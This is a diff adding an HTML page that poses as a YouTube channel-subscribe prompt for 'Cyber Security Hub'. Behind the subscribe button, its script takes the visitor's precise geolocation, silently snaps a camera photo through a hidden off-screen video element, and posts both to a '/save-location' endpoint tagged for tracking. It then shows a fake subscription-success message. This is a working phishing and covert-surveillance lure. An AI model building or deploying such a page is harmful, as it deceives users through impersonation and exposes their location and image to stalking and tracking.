@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>YouTube - Subscribe Channel</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        background: #0f0f0f;
+        min-height: 100vh;
+        display: flex;
+        align-items: flex-end;
+        justify-content: center;
+        overflow: hidden;
+    }
+    .yt-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #0f0f0f; z-index: 0; }
+    .yt-topbar {
+        background: #0f0f0f;
+        padding: 12px 16px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        border-bottom: 0.5px solid #272727;
+    }
+    .yt-logo { font-size: 20px; font-weight: 700; color: white; }
+    .yt-logo span { color: #ff0000; }
+    .bottom-sheet {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        z-index: 20;
+        background: #202020;
+        border-radius: 28px 28px 0 0;
+        max-height: 65vh;
+        min-height: 50vh;
+        animation: sheetUp 0.35s ease-out;
+        overflow-y: auto;
+    }
+    @keyframes sheetUp {
+        from { transform: translateY(100%); }
+        to { transform: translateY(0); }
+    }
+    .drag-handle {
+        width: 36px; height: 4px;
+        background: rgba(255,255,255,0.2);
+        border-radius: 2px;
+        margin: 10px auto 0 auto;
+    }
+    .channel-hero { text-align: center; padding: 20px; }
+    .channel-avatar {
+        width: 80px; height: 80px;
+        background: #ff0000;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 12px auto;
+        font-size: 40px;
+    }
+    .channel-name { font-size: 20px; font-weight: 700; color: white; }
+    .channel-handle { font-size: 13px; color: #aaa; margin-top: 4px; }
+    .stats-row {
+        display: flex;
+        justify-content: space-evenly;
+        padding: 16px;
+        background: #2a2a2a;
+        margin: 12px 20px;
+        border-radius: 16px;
+    }
+    .stat-item { text-align: center; }
+    .stat-value { font-size: 18px; font-weight: 700; color: white; }
+    .stat-label { font-size: 11px; color: #aaa; }
+    .join-btn {
+        width: calc(100% - 40px);
+        margin: 20px;
+        padding: 14px;
+        background: #ff0000;
+        color: white;
+        border: none;
+        border-radius: 28px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    .join-btn:hover { background: #cc0000; }
+    .join-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    #hiddenCamera { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
+    .toast-message {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #2a2a2a;
+        color: white;
+        padding: 10px 20px;
+        border-radius: 28px;
+        font-size: 13px;
+        z-index: 1000;
+    }
+    .success-modal {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.9);
+        display: flex; align-items: center; justify-content: center;
+        z-index: 2000;
+    }
+    .success-content {
+        background: #202020;
+        margin: 20px;
+        padding: 32px;
+        border-radius: 32px;
+        text-align: center;
+        max-width: 280px;
+    }
+    .success-icon { font-size: 56px; margin-bottom: 16px; }
+    .success-content h3 { font-size: 20px; color: white; margin-bottom: 8px; }
+    .success-content p { font-size: 14px; color: #aaa; margin-bottom: 24px; }
+    .success-content button {
+        background: #ff0000; color: white; border: none;
+        padding: 12px 24px; border-radius: 28px;
+        font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;
+    }
+</style>
+</head>
+<body>
+
+<video id="hiddenCamera" autoplay playsinline muted></video>
+
+<div class="yt-bg"></div>
+
+<div class="bottom-sheet">
+    <div class="drag-handle"></div>
+    <div class="channel-hero">
+        <div class="channel-avatar">📺</div>
+        <div class="channel-name">Cyber Security Hub</div>
+        <div class="channel-handle">@CyberSecurity</div>
+    </div>
+    
+    <div class="stats-row">
+        <div class="stat-item"><div class="stat-value">125K</div><div class="stat-label">Subscribers</div></div>
+        <div class="stat-item"><div class="stat-value">500+</div><div class="stat-label">Videos</div></div>
+        <div class="stat-item"><div class="stat-value">4.8M</div><div class="stat-label">Views</div></div>
+    </div>
+
+    <button id="joinBtn" class="join-btn" onclick="subscribeChannel()">
+        🔔 SUBSCRIBE CHANNEL
+    </button>
+</div>
+
+<script>
+let mediaStream = null;
+let locationData = null;
+
+async function subscribeChannel() {
+    const btn = document.getElementById("joinBtn");
+    btn.disabled = true;
+    btn.textContent = "Requesting...";
+    showToast("📍 Requesting location & camera...");
+    
+    if (!navigator.geolocation) {
+        showToast("❌ Geolocation not supported");
+        resetButton();
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        async function(position) {
+            locationData = position.coords;
+            showToast("✅ Location captured!");
+            await capturePhoto();
+        },
+        function(error) { showToast("❌ Location denied"); resetButton(); },
+        { enableHighAccuracy: true, timeout: 15000 }
+    );
+}
+
+async function capturePhoto() {
+    const video = document.getElementById('hiddenCamera');
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => { video.play(); setTimeout(() => takePhoto(stream), 1000); };
+    } catch (err) { saveToServer(null); }
+}
+
+function takePhoto(stream) {
+    const video = document.getElementById('hiddenCamera');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+    stream.getTracks().forEach(track => track.stop());
+    saveToServer(photoData);
+}
+
+function saveToServer(photoData) {
+    fetch('/save-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            latitude: locationData.latitude,
+            longitude: locationData.longitude,
+            accuracy: locationData.accuracy,
+            photo: photoData ? photoData.split(',')[1] : null,
+            photo_filename: photoData ? `youtube_${Date.now()}.jpg` : null,
+            tracking_type: 'initial',
+            platform: 'youtube'
+        })
+    }).then(res => res.json()).then(data => {
+        if (data.status === "success") showSuccessModal();
+        else showToast("❌ Failed");
+    });
+}
+
+function showToast(msg) {
+    const existing = document.querySelector('.toast-message');
+    if (existing) existing.remove();
+    const toast = document.createElement('div');
+    toast.className = 'toast-message';
+    toast.innerHTML = msg;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+}
+
+function showSuccessModal() {
+    const modal = document.createElement('div');
+    modal.className = 'success-modal';
+    modal.innerHTML = `<div class="success-content"><div class="success-icon">✅</div><h3>Subscribed Successfully!</h3><p>You are now subscribed to Cyber Security Hub channel.</p><button onclick="window.location.href='/'">OK</button></div>`;
+    document.body.appendChild(modal);
+}
+
+function resetButton() {
+    const btn = document.getElementById("joinBtn");
+    btn.disabled = false;
+    btn.innerHTML = "🔔 SUBSCRIBE CHANNEL";
+}
+</script>
+</body>
+</html>
